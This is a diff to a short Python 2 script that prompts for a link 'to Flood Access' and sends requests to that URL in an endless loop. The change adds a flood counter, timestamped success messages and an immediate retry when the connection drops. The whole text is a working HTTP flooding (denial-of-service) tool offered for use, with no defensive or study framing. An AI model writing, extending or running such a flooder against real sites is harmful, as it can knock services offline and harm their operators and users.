@@ -7,10 +7,15 @@ inp_link = raw_input("[+] Enter Link to Flood Access: ")
 def banned(inp_link):
     request = urllib2.Request(inp_link, headers=agent)
     dump = urllib2.urlopen(request)
-    #print dump.read()
-    #get_title = dump[dump.find('<title>')+len('<title>'):]
-    print "[+] Success", time.strftime('%D hours: %H minute: %M second: %S')
     return dump
 
+tmp = 0
 while True:
-    banned(inp_link)
+    tmp += 1
+    try:
+        banned(inp_link)
+        print "[+] Success flood ke: %s" % tmp, time.strftime(' --at time: %H minute: %M second: %S')
+
+    except URLError, e:
+        print "[+] Lost Connection..."
+        banned(inp_link)
